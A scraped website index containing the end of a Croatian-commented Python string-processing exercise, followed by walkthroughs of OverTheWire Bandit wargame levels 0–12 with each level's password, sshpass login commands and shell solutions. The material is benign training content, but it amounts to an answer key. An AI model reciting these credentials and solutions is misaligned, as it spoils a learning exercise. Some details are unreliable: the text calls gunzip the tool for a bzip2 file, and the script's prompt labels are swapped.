gdje, metodu u klasi mozes definirati kao staticno.\n# pycharm je preorucio da bude izvan klase, pa evo je izvan\n# Jos malo o definicijama. Metoda i funkcija su jedno te isto. Razlika je jedina da funkciju u nekoj klasi zoves metoda\n# a funkciju koja nije u klasi, funkcija\ndef convert_to_roman(num):\n    # Storing roman values of digits from 0-9\n    # when placed at different places\n    m = [\"\", \"M\", \"MM\", \"MMM\"]\n    c = [\"\", \"C\", \"CC\", \"CCC\", \"CD\", \"D\",\n         \"DC\", \"DCC\", \"DCCC\", \"CM \"]\n    x = [\"\", \"X\", \"XX\", \"XXX\", \"XL\", \"L\",\n         \"LX\", \"LXX\", \"LXXX\", \"XC\"]\n    i = [\"\", \"I\", \"II\", \"III\", \"IV\", \"V\",\n         \"VI\", \"VII\", \"VIII\", \"IX\"]\n\n    # Converting to roman\n    thousands = m[num // 1000]\n    hundreds = c[(num % 1000) // 100]\n    tens = x[(num % 100) // 10]\n    ones = i[num % 10]\n\n    ans = (thousands + hundreds +\n           tens + ones)\n\n    return ans\n\n\nclass Obrada_Stringa:\n    # parameterized constructor\n    def __init__(self, string):\n        # Konstruktor, ova metoda se izvrsava svaki puta kada instanciras now objekt sa npr. recenica = Obrada_Stringa(unos)\n        # posto imas pored self, koji je obavezan uvijek, i string varijabli, kada instanciras objekt uvijek moras\n        # sa nekim unosom to instancirati\n\n        # ovdje dodajemo varijable koje ce biti poznate samo unutar klase. Znaci ovo self.string znaci to je varijabla\n        # string koja je poznata samo toj klasi i nikome drugom.\n        self.string = string\n        # ovo je lista posebni znakova, znaci ono kaj u zadatku trazi da prebrojis posebne znakove. Ako je znak u toj\n        # listi onda je to posebni znak\n        self.punctuation = ['!', '\"', '#', '$', '%', '&amp;', '\\'', '(', ')', '*', '+', ',', '-', '.', '/', ':', ';', '&lt;',\n                            '=', '&gt;', '?', '@', '[', '\\\\', ']', '^', '_', '`', '{', '|', '}', '~']\n\n    # prvo napravimo ovu metodu jer cemo to trebati cesto, mozes jednostavno koristiti i self.string.split.\n    def get_word_list(self):\n        return self.string.split()\n\n    # a.) svaku rijec u listu\n    # trazi nesto kao string to word list\n    # https://stackoverflow.com/questions/6181763/converting-a-string-to-a-list-of-words\n    # ovdje umjesto ove metode get_word_list mozes jednostavno koristiti self.string.split(). AL evo ja sam koristio\n    # metodu\n    def string_to_word_list(self):\n        return self.get_word_list()\n\n    # b.) broj velikih i malih slova, brojeva i znakova\n    # ovu sam metodu malo promijenio tako da ona sama nista ne ispisuje vec vraza jedan dictionary sa vrijednostima\n    # pogledaj si sto je dictionary ako si zaboravila ali u biti imas neki naziv pa onda dvotocka i vrijednost koja\n    # pripada tom naziv. Kad dobijes taj dictionary onda ne pristupas podatcima sa indexom (npr list[0]) nego sa imenon\n    # npr. lista['capital_letters']\n    def calculate_characters_in_string(self):\n        string_calculation = {'capital_letters': sum(1 for c in self.string if c.isupper()),\n                              'normal_letters': sum(1 for c in self.string if c.islower()),\n                              'numbers': sum(1 for c in self.string if c.isnumeric()),\n                              'punctuation': sum(1 for c in self.string if c in self.punctuation)}\n        return string_calculation\n\n    # metoda ide kroz svaku rijec i provjerava dal je broj (isnumerica)\n    # ako je doda je u listu i to vraca kao rezultat\n    def get_numbers_from_word_list(self):\n        brojevi = []\n        for word in self.get_word_list():\n            if word.isnumeric():\n                brojevi.append(word)\n        return brojevi\n\n    # metoda opet prolazi kroz sve rijeci i \"okrece\" ih te ih stavlja u listu \"unazad\" i tu listu vraca kao rezultat\n    def unazad_rijeci(self):\n        unazad = []\n        for rijec in self.get_word_list():\n            unazad.append(rijec[::-1])\n        return unazad\n\n    # mislim da ovaj dio nije dobro postavljen jer uppercase cijelog stringa i kapitalizacija svakog slova je jedno te\n    # ist0. Kak god, metoda prvo ide preko svakog znaka (i preko space-a \" \" i napravi iz njega veliko slovo\n    # nakon toga \"pomijesa\" listu i vraca jedan string koji gdje su svi znakovi spojeni\n    # to spajannje u jedan string smo mogli napraviti i kod ispisa.\n    def preoblikuj_unos(self):\n        characters = []\n        for char in self.string:\n            characters.append(char.upper())\n        random.shuffle(characters)\n        return ''.join(characters)\n\n    # ova metoda ima jedan dodatan argument izbor. izbor je znak koji se upise kad te program pita dal zelis\n    # brojke ili slova (b ili s)\n    # ako je izbor bio b (veliko ili malo b) petlja prolazi kroz svaki znak i ako je znak dio abecede dodaje ga u listu\n    # characters. Ako je izbor bio s, onda to isto radi samo provjerava dal je znak numericki i ako je dodaje ga u listu\n    # na kraju vraca list characters\n    def filtriraj(self, izbor):\n        characters = []\n        if izbor in [\"b\", \"B\"]:\n            for char in self.string:\n                if char.isalpha() or char == ' ':\n                    characters.append(char)\n        elif izbor in [\"s\", \"S\"]:\n            for char in self.string:\n                if char.isnumeric() or char == ' ':\n                    characters.append(char)\n        return characters\n\n\n# Ovdje instanciramo objekt. Znaci iz klase Obrada_Stringa, kaj je blueprint (koja svojstva ce imati objekt,\n# koje metode itd), stvorimo, instanciramo objekt ivana. objekt ivana moze imati ime koje hoces. I posto smo u\n# konstruktoru definirali da mora imati neki string (u zagradi), neki string je obavezan ( U ovom slcaju \"Ifka uc...\")\n# Ispod maknes komentar da bi te pitao za recenicu. Ja sam to komentirao da imam neku recenicu spremno i da ne trebam ]\n# stalno nesto upisivati. A recenica je takva da ima i velika i mala slova, posebne znakove i brojke.\n# ivana = input(\"Upisi recenicu: \")\nivana = \"Ifka uci python 23 dana po 6 sati !!!\"\nrecenica = Obrada_Stringa(ivana)\n\n# za a:)\n# pozivas metodu klase/objekta. TO radis tak ta iza objekta ivana dodas tocku i onda metodu(funkciju)\n# pycharm automatski izlista koje metode mozes dodati tj koje su vidljive. Vjerojatno i vscode\nprint(f\"\"\"\n    a.) Lista rijeci, brojeva i posebnih znakova:\n{recenica.string_to_word_list()}\n    \"\"\")\n\n# b.)\n# objasnio sam u metodi kako pristupas vrijednostima, znaci ne indexom nego imenom\nprint(f\"\"\"\n    b.) Analiza znakova u recenici:\n        Velika slova :  {recenica.calculate_characters_in_string()['capital_letters']}\n        Mala slova :    {recenica.calculate_characters_in_string()['normal_letters']}\n        Brojevi :       {recenica.calculate_characters_in_string()['numbers']}\n        Znakovi :       {recenica.calculate_characters_in_string()['punctuation']}\n    \"\"\")\n\n# c.)\n# ovo je vise formatiranje ispis nego bilo kaj drugo.\n# Prvo ispisujemo zaglavlje i nakon toga sa for petljom vadimo brojeve iz objekta,recenice i za svaki izvadjeni\n# decimalni broj pozovemo funkciju convert_to_roman. Bitno je da broj bude int\nprint(\"    c.) Pronadjeni brojevi u recenici\")\nfor broj in recenica.get_numbers_from_word_list():\n    print(f\"         Broj: {broj} - Rimski ekvivalent: {convert_to_roman(int(broj))}\")\n\n# d.)\n# Ovo si ti zapravo sama rijesila pa sve znas\nprint(f\"\"\"\n    d.) Rijeci napisane unazadno:\n{recenica.unazad_rijeci()}\n        Recenica ispisano unazad:\n{' '.join(recenica.unazad_rijeci())}\n\"\"\")\n\n# e.)\nprint(f\"\"\"\n    e.) Preoblikovan unos (sve rijeci uppercase, spajane stringa i mijesanje slova:\n{recenica.preoblikuj_unos()}\n\"\"\")\n\n# f.)\n# program pita dal zelis filtrirati brojeve ili slova i bilo koje drugo slovo nego s ili b prekida program\n# ako si upisala b ili s u drugom if- provjerava koje si tocno slovo upisala i shodno tome poziva metodu \"filtriaj\"\n# sa odgovarajucim parametrom (izbor)\nizbor = input(\"Zelis filtrirat brojeve ili slova ? Za brojeve upisi 'b' a za slova 's': \")\nif izbor not in [\"s\", \"S\", \"b\", \"B\"]:\n    print(\"Krivi unos.\")\nelse:\n    if izbor in [\"s\", \"S\"]:\n        print(f\"Unos sa filtrirajim slovima je: {''.join(recenica.filtriraj(izbor))}\")\n    else:\n        print(f\"Unos sa filtrirajim brojevima je: {''.join(recenica.filtriraj(izbor))}\")\n</code></pre> <p>Ispis:</p> <pre><code>/usr/bin/python3.8 \"/home/bonzo/code/python/the_python_workbook/01 Introduction to Programming/Zivotinje.py\"\n\n    a.) Lista rijeci, brojeva i posebnih znakova:\n        ['Ifka', 'uci', 'python', '23', 'dana', 'po', '6', 'sati', '!!!']\n\n\n    b.) Analiza znakova u recenici:\n        Velika slova :  1\n        Mala slova :    22\n        Brojevi :       3\n        Znakovi :       3\n\n    c.) Pronadjeni brojevi u recenici\n         Broj: 23 - Rimski ekvivalent: XXIII\n         Broj: 6 - Rimski ekvivalent: VI\n\n    d.) Rijeci napisane unazadno:\n        ['akfI', 'icu', 'nohtyp', '32', 'anad', 'op', '6', 'itas', '!!!']\n        Recenica ispisano unazad:\n        akfI icu nohtyp 32 anad op 6 itas !!!\n\n\n    e.) Preoblikovan unos (sve rijeci uppercase, spajane stringa i mijesanje slova:\n        D!3 O!INAA !  IA6 YNIH2FS OT UCTAP KP\n\nZelis filtrirat brojeve ili slova ? Za brojeve upisi 'b' a za slova 's': b\nUnos sa filtrirajim brojevima je: Ifka uci python  dana po  sati \n\nProcess finished with exit code 0\n</code></pre>"},{"location":"overthewire/bandit/level0-1/","title":"Bandit Level 0-1@overthewire.org","text":""},{"location":"overthewire/bandit/level0-1/#description","title":"Description","text":"<p>The password for the next level is stored in a file called <code>readme</code> located in the <code>home directory</code>. Use this password to log into <code>bandit1</code> using <code>SSH</code>. Whenever you find a password for a level, use <code>SSH</code> (on <code>port 2220</code>) to log into that level and continue the game.</p>"},{"location":"overthewire/bandit/level0-1/#current-level-credentials","title":"Current level credentials","text":"Key Value Server-name: bandit.labs.overthewire.org Port: 2220 User: bandit0 Password: bandit0"},{"location":"overthewire/bandit/level0-1/#current-level-login","title":"Current level login","text":"Login <p><pre><code>sshpass -p bandit0 ssh -p 2220 bandit0@bandit.labs.overthewire.org\n</code></pre> Note: You might need to install <code>sshpass</code> before using it. The <code>ssh</code> command can also be used on its own. If so, copy-paste the password when requested.</p>"},{"location":"overthewire/bandit/level0-1/#hints-and-solution","title":"Hints And Solution","text":"Hint(s) Hint 1Hint 2 <p>to list information about files in a directory, use <code>ls</code></p> <p>to print files on the standard output, use <code>cat</code></p> Solution <pre><code>bandit0@bandit:~$ ls -al # (1) \ntotal 24  \ndrwxr-xr-x  2 root    root    4096 May  7  2020 .  \ndrwxr-xr-x 41 root    root    4096 May  7  2020 ..  \n-rw-r--r--  1 root    root     220 May 15  2017 .bash_logout  \nrw-r--r--   1 root    root    3526 May 15  2017 .bashrc  \n-rw-r--r--  1 root    root     675 May 15  2017 .profile  \n-rw-r-----  1 bandit1 bandit0   33 May  7  2020 readme  bandit0@bandit:~$ cat readme  # (2) \n</code></pre> <ol> <li>use <code>ls</code> to list the files in the current directory. Use switches like <code>-a</code> to get more information about files </li> <li>use <code>cat</code> to print the content of the file <code>readme</code> to the standard output </li> </ol> <p>First we check the directory if there is a file called <code>readme</code> in the folder. We can use <code>ls</code> for that. We find the file and <code>cat</code> it out to the standard output with <code>cat readme</code></p>"},{"location":"overthewire/bandit/level0-1/#resources","title":"Resources","text":"Resources <p>Bandit-level1@overthewire cat man page @ linux.die.net ls man page @ linux.die.net </p>"},{"location":"overthewire/bandit/level0/","title":"Bandit Level 0@overthewire.org","text":""},{"location":"overthewire/bandit/level0/#description","title":"Description","text":"<p>The goal of this level is for you to log into the game using <code>SSH</code>. The host to which you need to connect is <code>bandit.labs.overthewire.org</code>, on <code>port 2220</code>. The username is <code>bandit0</code> and the password is <code>bandit0</code>. Once logged in, go to the Level 1 page to find out how to beat Level 1.</p>"},{"location":"overthewire/bandit/level0/#current-level-credentials","title":"Current level credentials","text":"Key Value Server-name: bandit.labs.overthewire.org Port: 2220 User: bandit0 Password: bandit0"},{"location":"overthewire/bandit/level0/#current-level-login","title":"Current level login","text":"Log in <p><pre><code>sshpass -p bandit0 ssh -p 2220 bandit0@bandit.labs.overthewire.org\n</code></pre> Note: You might need to install <code>sshpass</code> before using it. The <code>ssh</code> command can also be used on its own. If so, copy-paste the password when requested.</p>"},{"location":"overthewire/bandit/level0/#hints-and-solution","title":"Hints And Solution","text":"Hint(s) <p>to connect to a non-standard port on SSH, use the <code>-p</code> option</p> Solution <pre><code>  ssh -p 2220 bandit0@bandit.labs.overthewire.org\n</code></pre>"},{"location":"overthewire/bandit/level0/#resources","title":"Resources","text":"Resources <p>Bandit-level0@overthewire Secure Shell (SSH) on Wikipedia How to use SSH on wikiHow ssh man page @linux.die.net</p>"},{"location":"overthewire/bandit/level1-2/","title":"Bandit Level 1-2@overthewire.org","text":""},{"location":"overthewire/bandit/level1-2/#description","title":"Description","text":"<p>The password for the next level is stored in a file called <code>-</code> located in the home directory</p>"},{"location":"overthewire/bandit/level1-2/#current-level-credentials","title":"Current level credentials","text":"Key Value Server-name: bandit.labs.overthewire.org Port: 2220 User: bandit1 Password: NH2SXQwcBdpmTEzi3bvBHMM9H66vVXjL"},{"location":"overthewire/bandit/level1-2/#current-level-login","title":"Current level login","text":"Log in <p><pre><code>sshpass -p NH2SXQwcBdpmTEzi3bvBHMM9H66vVXjL ssh -p 2220 bandit1@bandit.labs.overthewire.org\n</code></pre> Note: You might need to install <code>sshpass</code> before using it. The <code>ssh</code> command can also be used on its own. If so, copy-paste the password when requested.</p>"},{"location":"overthewire/bandit/level1-2/#hints-and-solution","title":"Hints And Solution","text":"Hint(s) Hint 1 <p>Look through the links in the Resources section. Look up <code>linux print filename with dash</code> in Google. </p> Solution <pre><code>bandit1@bandit:~$ cat &lt; -    # (1)\n\nbandit1@bandit:~$ cat ./-    # (2)\n\nbandit1@bandit:~$ cat /home/bandit1/- # (3)\n</code></pre> <ol> <li>redirect <code>-</code> into <code>cat</code> </li> <li>add the path to the filename, either absolute or relative. The current directory is indicated by <code>./</code>. This is a relative path</li> <li><code>cat</code> with an absolute path (absolute paths always begin with <code>/</code>)</li> </ol> <p>The argument <code>-</code> denotes STDIN/STDOUT, i.e. dev/stdin or dev/stdout. You can read such a file by redirecting the filename into cat, <code>cat &lt; -</code> or by using the absolute or relative path to the file. <code>cat./-</code> or <code>cat /home/bandit1/-</code> are two examples. If the filename contains additional characters after <code>-</code>, for example, <code>-filename</code>, it no longer refers to STDIN/STDOUT, but the shell treats it as a <code>cat</code> option rather than a filename. To make it treat it as a filename, use a double dash. <code>--</code> indicates the end of command options, so a filename with a dash in it will no longer be treated as an option. </p>"},{"location":"overthewire/bandit/level1-2/#resources","title":"Resources","text":"Resources <p>Bandit-level2@overthewire Google Search for \u201cdashed filename\u201d Advanced Bash-scripting Guide - Chapter 3 - Special Characters What does \"--\" (double-dash) mean? Absolute and Relative Pathnames in UNIX @geeksforgeeks.org</p>"},{"location":"overthewire/bandit/level10-11/","title":"Bandit Level 10-11@overthewire.org","text":""},{"location":"overthewire/bandit/level10-11/#description","title":"Description","text":"<p>The password for the next level is stored in the file data.txt, which contains base64 encoded data.</p>"},{"location":"overthewire/bandit/level10-11/#current-level-credentials","title":"Current level credentials","text":"Key Value Server-name: bandit.labs.overthewire.org Port: 2220 User: bandit10 Password: G7w8LIi6J3kTb8A7j9LgrywtEUlyyp6s"},{"location":"overthewire/bandit/level10-11/#current-level-login","title":"Current level login","text":"Log in <p><pre><code>sshpass -p G7w8LIi6J3kTb8A7j9LgrywtEUlyyp6s ssh -p 2220 bandit10@bandit.labs.overthewire.org\n</code></pre> Note: You might need to install <code>sshpass</code> before using it. The <code>ssh</code> command can also be used on its own. If so, copy-paste the password when requested. </p>"},{"location":"overthewire/bandit/level10-11/#hints-and-solution","title":"Hints And Solution","text":"Hint(s) Hint 1Hint 2 <p>The command <code>base64</code> has a decode flag to decode encoded data. See the man page for details on how to use it. </p> <p>There are numerous online encoders and decoders available. Look them up. With Google, for example.</p> Solution <pre><code>bandit10@bandit:~$ ls -al  \ntotal 24  \ndrwxr-xr-x \u00a02 root \u00a0\u00a0\u00a0\u00a0root \u00a0\u00a0\u00a0\u00a04096 May \u00a07 \u00a02020 .  \ndrwxr-xr-x 41 root \u00a0\u00a0\u00a0\u00a0root \u00a0\u00a0\u00a0\u00a04096 May \u00a07 \u00a02020 ..  \n-rw-r--r-- \u00a01 root \u00a0\u00a0\u00a0\u00a0root \u00a0\u00a0\u00a0\u00a0\u00a0220 May 15 \u00a02017 .bash_logout  \n-rw-r--r-- \u00a01 root \u00a0\u00a0\u00a0\u00a0root \u00a0\u00a0\u00a0\u00a03526 May 15 \u00a02017 .bashrc  \n-rw-r----- \u00a01 bandit11 bandit10 \u00a0\u00a069 May \u00a07 \u00a02020 data.txt  \n-rw-r--r-- \u00a01 root \u00a0\u00a0\u00a0\u00a0root \u00a0\u00a0\u00a0\u00a0\u00a0675 May 15 \u00a02017 .profile  \n\nbandit10@bandit:~$ cat data.txt \u00a0  VGhlIHBhc3N3b3JkIGlzIElGdWt3S0dzRlc4TU9xM0lSRnFyeEUxaHhUTkViVVBSCg==  bandit10@bandit:~$ cat data.txt | base64 -d  # (1)\nThe password is xxxxxxxxxxxxxxxxxxxxxxxxxxx </code></pre> <ol> <li>the output of <code>cat</code> is piped into the command <code>base64</code> using the <code>-d</code> flag to decode the data</li> </ol> <p>The command <code>ls -al</code> reveals that the file <code>data.txt</code> is in the home directory. The description implies that the data is <code>base64</code> encoded, but if it didn't, you could still recognize such an encoding using the following method.  The contents of <code>data.txt</code> are displayed as a string with uppercase and lowercase characters and two <code>=</code> at the end. It indicates that it is a <code>base64</code> encoded string. The character set for <code>base64</code> encoded output is <code>[A-Z, a-z, 0-9, and + /]</code>. The output of a <code>base64</code> encoded string must be a multiple of four. If it is not a multiple of 4, the output is padded with <code>=</code> characters until it is a multiple of 4. The string ends with two <code>=</code> characters, and the character set matches, indicating that it is almost certainly a <code>base64-encoded</code> output. Use the <code>base64</code> command with the <code>-d</code> flag to decode a <code>base64</code> encoded string. </p>"},{"location":"overthewire/bandit/level10-11/#resources","title":"Resources","text":"Resources <p>Bandit-level11@overthewire How to check whether a string is Base64 encoded or not man page for base64 command @man7.org base64 @wikipedia.org online base64 decoding with cyberchef </p>"},{"location":"overthewire/bandit/level11-12/","title":"Bandit Level 11-12@overthewire.org","text":""},{"location":"overthewire/bandit/level11-12/#description","title":"Description","text":"<p>The password for the next level is stored in the file data.txt, where all lowercase (a-z) and uppercase (A-Z) letters have been rotated by 13 positions.</p>"},{"location":"overthewire/bandit/level11-12/#current-level-credentials","title":"Current level credentials","text":"Key Value Server-name: bandit.labs.overthewire.org Port: 2220 User: bandit11 Password: 6zPeziLdR2RKNdNYFNb6nVCKzphlXHBM"},{"location":"overthewire/bandit/level11-12/#current-level-login","title":"Current level login","text":"Log in <p><pre><code>sshpass -p 6zPeziLdR2RKNdNYFNb6nVCKzphlXHBM ssh -p 2220 bandit11@bandit.labs.overthewire.org\n</code></pre> Note: You might need to install <code>sshpass</code> before using it. The <code>ssh</code> command can also be used on its own. If so, copy-paste the password when requested. </p>"},{"location":"overthewire/bandit/level11-12/#hints-and-solution","title":"Hints And Solution","text":"Hint(s) Hint 1Hint 2 <p>It's a substitution encryption. Look it up and see if there are any that shift 13 positions. </p> <p>Search for <code>ROT13</code>. Is there a tool you can use online, a command you can use, or an app you can install? </p> Solution <pre><code>bandit11@bandit:~$ ls -al  \ntotal 24  \ndrwxr-xr-x \u00a02 root \u00a0\u00a0\u00a0\u00a0root \u00a0\u00a0\u00a0\u00a04096 May \u00a07 \u00a02020 .  \ndrwxr-xr-x 41 root \u00a0\u00a0\u00a0\u00a0root \u00a0\u00a0\u00a0\u00a04096 May \u00a07 \u00a02020 ..  \n-rw-r--r-- \u00a01 root \u00a0\u00a0\u00a0\u00a0root \u00a0\u00a0\u00a0\u00a0\u00a0220 May 15 \u00a02017 .bash_logout  \n-rw-r--r-- \u00a01 root \u00a0\u00a0\u00a0\u00a0root \u00a0\u00a0\u00a0\u00a03526 May 15 \u00a02017 .bashrc  \n-rw-r----- \u00a01 bandit12 bandit11 \u00a0\u00a049 May \u00a07 \u00a02020 data.txt  \n-rw-r--r-- \u00a01 root \u00a0\u00a0\u00a0\u00a0root \u00a0\u00a0\u00a0\u00a0\u00a0675 May 15 \u00a02017 .profile  \n\nbandit11@bandit:~$ cat data.txt \u00a0  \nGur cnffjbeq vf 5Gr8L4qetPEsPk8htqjhRK8XSP6x2RHh  bandit11@bandit:~$ cat data.txt | tr 'A-Za-z' 'N-ZA-Mn-za-m' \u00a0  # (1)\nThe password is xxxxxxxxxxxxxxxxxxxxxx\n</code></pre> <ol> <li><code>cat</code> output is piped into the command <code>tr</code>. <code>tr</code> rotates the letters by 13 positions. </li> </ol> <p>The <code>ls -al</code> command reveals that the file <code>data.txt</code> is located in the home directory. The contents of the file <code>data.txt</code> are displayed as encrypted text. Because blank spaces are clearly visible, a substitution encryption is very likely. At the most basic level, the <code>Caesar cipher</code> or <code>ROT13</code> is used. In a basic Latin alphabet, such as the English alphabet, this cipher replaces a letter with the 13th letter of the alphabet. Because the alphabet is 26 characters long, <code>ROT13</code> can simply inverse an encoded string by repeating the algorithm on the encoded output. You can decode the string using <code>tr</code> or an online encoder/decoder.  In this example, the output of <code>cat data.txt</code> is piped to <code>tr 'A-Za-z' 'N-ZA-Mn-za-m'</code>. </p>"},{"location":"overthewire/bandit/level11-12/#resources","title":"Resources","text":"Resources <p>Bandit-level12@overthewire Rot13 on Wikipedia man page for tr command @man7.org How to decode rot13 @askubuntu.com rot13 encoder/decoder @rot13.com rot13 encoder/decoder @cyberchef </p>"},{"location":"overthewire/bandit/level12-13/","title":"Bandit Level 12-13@overthewire.org","text":""},{"location":"overthewire/bandit/level12-13/#description","title":"Description","text":"<p>The password for the next level is stored in the file data.txt, which is a hexdump of a file that has been repeatedly compressed. For this level it may be useful to create a directory under /tmp in which you can work using mkdir. For example: mkdir /tmp/myname123. Then copy the datafile using cp, and rename it using mv (read the manpages!).</p>"},{"location":"overthewire/bandit/level12-13/#current-level-credentials","title":"Current level credentials","text":"Key Value Server-name: bandit.labs.overthewire.org Port: 2220 User: bandit12 Password: JVNBBFSmZwKKOP0XbFXOoW8chDz5yVRv"},{"location":"overthewire/bandit/level12-13/#current-level-login","title":"Current level login","text":"Log in <p><pre><code>sshpass -p JVNBBFSmZwKKOP0XbFXOoW8chDz5yVRv ssh -p 2220 bandit12@bandit.labs.overthewire.org\n</code></pre> Note: You might need to install <code>sshpass</code> before using it. The <code>ssh</code> command can also be used on its own. If so, copy-paste the password when requested. </p>"},{"location":"overthewire/bandit/level12-13/#hints-and-solution","title":"Hints And Solution","text":"Hint(s) Hint 1Hint 2Hint 3 <p>Research how to unzip <code>gzip</code> and <code>bzip2</code> compressed files. </p> <p>To unzip <code>gzip</code> compressed files, the file must have an extension that allows <code>gzip</code> to recognize that it is compressed.   </p> <p>Research how to eXtract <code>tar</code> archives. </p> Solution <p>This challenge resembles a Matryoshka (Russian doll). The file has been numerous times compressed and tar'ed, and we must figure out how to <code>unzip</code> and <code>untar</code> the file in order to obtain the password for the subsequent level (peel off the layers). Every time we create a new file, we must use the <code>file</code> command to check what type of file it is in order to \"peel off another layer of the puzzle\". </p> <pre><code>bandit12@bandit:~$ ls -Al  \ntotal 24  \n-rw-r--r-- \u00a01 root \u00a0\u00a0\u00a0\u00a0root \u00a0\u00a0\u00a0\u00a0\u00a0220 May 15 \u00a02017 .bash_logout  \n-rw-r--r-- \u00a01 root \u00a0\u00a0\u00a0\u00a0root \u00a0\u00a0\u00a0\u00a03526 May 15 \u00a02017 .bashrc  \n-rw-r----- \u00a01 bandit13 bandit12 2582 May \u00a07 \u00a02020 data.txt  \n-rw-r--r-- \u00a01 root \u00a0\u00a0\u00a0\u00a0root \u00a0\u00a0\u00a0\u00a0\u00a0675 May 15 \u00a02017 .profile  \n\nbandit12@bandit:~$ mkdir /tmp/bonzo_otw \u00a0  \nbandit12@bandit:~$ cp data.txt /tmp/bonzo_otw \u00a0  \nbandit12@bandit:~$ cd /tmp/bonzo_otw  \nbandit12@bandit:/tmp/bonzo_otw$ ls -Al  \ntotal 1996  -rw-r----- 1 bandit12 root \u00a0\u00a0\u00a02582 Aug 15 14:11 data.txt\n\nbandit12@bandit:/tmp/bonzo_otw$ xxd -r data.txt &gt; data.bin  \nbandit12@bandit:/tmp/bonzo_otw$ ls -Al  \ntotal 8  \n-rw-r--r-- 1 bandit12 root \u00a0606 Aug 15 14:32 data.bin  \n-rw-r----- 1 bandit12 root 2582 Aug 15 14:11 data.txt\n</code></pre> <p>We'll create new files by modifying the existing one. To achieve that, we must be in a location where we have write permission. The <code>/tmp</code> directory must have a folder created in it, and we must utilize that directory as our working directory. We copy the initial file to the working directory. Because the initial file is described as a <code>hexdump</code>, we use <code>xxd</code> to convert it back to a binary file. </p> <pre><code>bandit12@bandit:/tmp/bonzo_otw$ file data.bin \u00a0  \ndata.bin: gzip compressed data, was \"data2.bin\", last modified: Thu May \u00a07 18:14:30 2020, max compressio  \nn, from Unix  \nbandit12@bandit:/tmp/bonzo_otw$ gunzip data.bin  \ngzip: data.bin: unknown suffix -- ignored  \nbandit12@bandit:/tmp/bonzo_otw$ mv data.bin data.gz  \nbandit12@bandit:/tmp/bonzo_otw$ gunzip data.gz  \nbandit12@bandit:/tmp/bonzo_otw$ ls -Al  \ntotal 8  \n-rw-r--r-- 1 bandit12 root \u00a0573 Aug 15 14:32 data  \n-rw-r----- 1 bandit12 root 2582 Aug 15 14:11 data.txt\n</code></pre> <p>The <code>file</code> command is used to determine the file type of the new binary file, and the output indicates that it is a <code>gzip</code> compressed file. We try to unzip the file with <code>'gunzip</code>, but it requires a file extension. To unzip the file, we could also use <code>gzip-d</code>. So we rename the <code>data.bin</code> file to <code>data.gz</code>, and now we can unzip it. Also, for future reference, keep in mind that <code>unzip</code> requires an extension to function.  </p> <pre><code>bandit12@bandit:/tmp/bonzo_otw$ file data  \ndata: bzip2 compressed data, block size = 900k  \n\nbandit12@bandit:/tmp/bonzo_otw$ bunzip2 data  \nbunzip2: Can't guess original name for data -- using data.out  \n\nbandit12@bandit:/tmp/bonzo_otw$ ls -Al  \ntotal 8  \n-rw-r--r-- 1 bandit12 root \u00a0431 Aug 15 14:32 data.out  \n-rw-r----- 1 bandit12 root 2582 Aug 15 14:11 data.txt\n</code></pre> <p>To determine the file type, we use the <code>file</code> command. It's compressed with <code>bzip2</code>. We look up how to decompress <code>gzip2</code> compressed data and use that information to unzip the file. Unlike with <code>gunzip</code>, we do not need to rename the file to make it work with <code>bunzip</code>.</p> <pre><code>bandit12@bandit:/tmp/bonzo_otw$ file data.out \u00a0  \ndata.out: gzip compressed data, was \"data4.bin\", last modified: Thu May \u00a07 18:14:30 2020, max compressio  \nn, from Unix  \nbandit12@bandit:/tmp/bonzo_otw$ mv data.out data.gz  \nbandit12@bandit:/tmp/bonzo_otw$ gunzip data.gz \u00a0  \nbandit12@bandit:/tmp/bonzo_otw$ ls -Al \u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0  \ntotal 24  \n-rw-r--r-- 1 bandit12 root 20480 Aug 15 14:32 data  \n-rw-r----- 1 bandit12 root \u00a02582 Aug 15 14:11 data.txt\n</code></pre> <p>The steps are the same. Determine the file format. If it's <code>gzip</code>, rename the file; if it's <code>bzip2</code>, you can leave it alone. <code>ls</code> will show you the new file. </p> <pre><code>bandit12@bandit:/tmp/bonzo_otw$ file data  \ndata: POSIX tar archive (GNU)  \nbandit12@bandit:/tmp/bonzo_otw$ tar -xf data  \nbandit12@bandit:/tmp/bonzo_otw$ ls -Al \u00a0\u00a0\u00a0\u00a0\u00a0\u00a0  \ntotal 36  \n-rw-r--r-- 1 bandit12 root 20480 Aug 15 14:32 data  \n-rw-r--r-- 1 bandit12 root 10240 May \u00a07 \u00a02020 data5.bin  \n-rw-r----- 1 bandit12 root \u00a02582 Aug 15 14:11 data.txt\n</code></pre> <p>We have a <code>tar</code> archive this time. The command changes, but the process stays the same. To <code>untar</code> the file, we use <code>tar -xf</code>. Unlike the zip-commands, a new file is created, but the original file is kept. </p> <pre><code>bandit12@bandit:/tmp/bonzo_otw$ file data5.bin \u00a0  \ndata5.bin: POSIX tar archive (GNU)  \nbandit12@bandit:/tmp/bonzo_otw$ tar -xf data5.bin  \nbandit12@bandit:/tmp/bonzo_otw$ ls -Al  \ntotal 40  \n-rw-r--r-- 1 bandit12 root 20480 Aug 15 14:32 data  \n-rw-r--r-- 1 bandit12 root 10240 May \u00a07 \u00a02020 data5.bin  \n-rw-r--r-- 1 bandit12 root \u00a0\u00a0222 May \u00a07 \u00a02020 data6.bin  \n-rw-r----- 1 bandit12 root \u00a02582 Aug 15 14:11 data.txt\n\nbandit12@bandit:/tmp/bonzo_otw$ rm data data5.bin data.txt \u00a0  \nbandit12@bandit:/tmp/bonzo_otw$ ls -Al  \ntotal 4  \n-rw-r--r-- 1 bandit12 root 222 May \u00a07 \u00a02020 data6.bin\n</code></pre> <p>Since it's a <code>tar</code> archive again, we simply repeat the steps from before. Since there are now files that we don't use anymore, let's do some housekeeping and delete those unneeded files.  Because this is another tar archive, we simply repeat the previous steps. Since there are now files that we no longer use, let's do some housekeeping and delete those files. </p> <pre><code>bandit12@bandit:/tmp/bonzo_otw$ file data6.bin \u00a0  \ndata6.bin: bzip2 compressed data, block size = 900k  \nbandit12@bandit:/tmp/bonzo_otw$ bunzip2 data6.bin  \nbunzip2: Can't guess original name for data6.bin -- using data6.bin.out  \nbandit12@bandit:/tmp/bonzo_otw$ ls -Al  \ntotal 12  \n-rw-r--r-- 1 bandit12 root 10240 May \u00a07 \u00a02020 data6.bin.out\n</code></pre> <p>It's a compressed <code>bzip2</code> file. We don't need to change the extension, so we just use the command <code>gunzip</code> to unzip it. </p> <pre><code>bandit12@bandit:/tmp/bonzo_otw$ file data6.bin.out \u00a0  \ndata6.bin.out: POSIX tar archive (GNU)  